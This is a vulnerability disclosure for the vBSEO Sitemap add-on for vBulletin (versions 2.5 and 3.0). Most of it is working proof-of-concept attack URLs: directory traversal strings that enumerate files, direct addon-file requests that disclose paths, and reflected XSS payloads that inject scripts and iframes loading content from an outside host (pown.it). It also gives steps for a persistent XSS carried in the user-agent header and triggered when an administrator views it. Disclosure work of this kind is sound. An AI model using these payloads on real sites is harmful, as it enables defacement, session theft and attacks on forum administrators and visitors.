
vBSEO is prone to multiple vulnerabilities, such as path disclosure, enumeration of files, persistent and non-persistent XSS. Please see the details below.

vBSEO Sitemap 3.0 Gold:

Enumeration and confirmation of files:

http://www.example.com/vbulletin/upload/vbseo_sitemap/index.php?rlist=true&amp;details=../../../vb4_readme.txt

http://www.example.com/vbulletin/upload/vbseo_sitemap/index.php?hitdetails=../../../../vb4_readme.txt

Proof of Concept XSS: (Non-Persistent)

http://www.example.com/vbulletin/upload/vbseo_sitemap/index.php?dlist=true&amp;botsonly=%22%3E%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E

http://www.example.com/vbulletin/upload/vbseo_sitemap/index.php?hitdetails=PADPAD%20%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=3663%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E

Path Disclosure: (any file in the addon directory - includes fatal errors)

http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_calendar.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads2.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_medialibrary.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links3.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vbagallery.php

----------------------- END OF vBSEO 3.0 -----------------------

vBSEO Sitemap 2.5: (initial first release)

Enumeration and confirmation of files:

http://www.example.com/vbseo_sitemap/index.php?details=../../robots.txt

http://www.example.com/vbseo_sitemap/index.php?hitdetails=../../../robots.txt

Non-Persistent XSS: (PoC)

http://www.example.com/vbseo_sitemap/index.php?dlist=true&amp;botsonly=%22%3E%3Cscript%3Edocument.documentElement.innerHTML=%22%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E%22;%3C/script%3E

[May require bot hits to work!] http://www.example.com/vbseo_sitemap/index.php?removedl[0]=&amp;botsonly=%22%3E%3Cscript%3Edocument.documentElement.innerHTML=%22%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E%22;%3C/script%3E

http://www.example.com/vbseo_sitemap/index.php?hitdetails=PADPAD%20%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=3663%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E

Path Disclosure: (any file in the addon directory - includes fatal errors)

http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_calendar.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads2.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba.php
http://www.example.com/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links.php
http://www.example.com/includes/functions_vbseo_url.php

----------------------- END OF vBSEO 2.5 -----------------------

vBSEO Sitemap: (Most likely all versions)

Persistent XSS: 
1) The user-agent is not sanitized in a sufficient way allowing an attacker to inject persistent scripts.

2) Then the attacker must request the sitemap via one of the following links:

- http://www.example.com/vbulletin/upload/vbseo_sitemap/index.php?dlist=true
- http://www.example.com/vbulletin/upload/vbseo_sitemap/vbseo_getsitemap.php?sitemap=sitemap_index.xml.gz

3) Then an authenticated administrator must view one of the pages containing the injected and potentially malicious user-agent:
http://www.example.com/vbseo_sitemap/index.php?dlist=true&amp;page=357

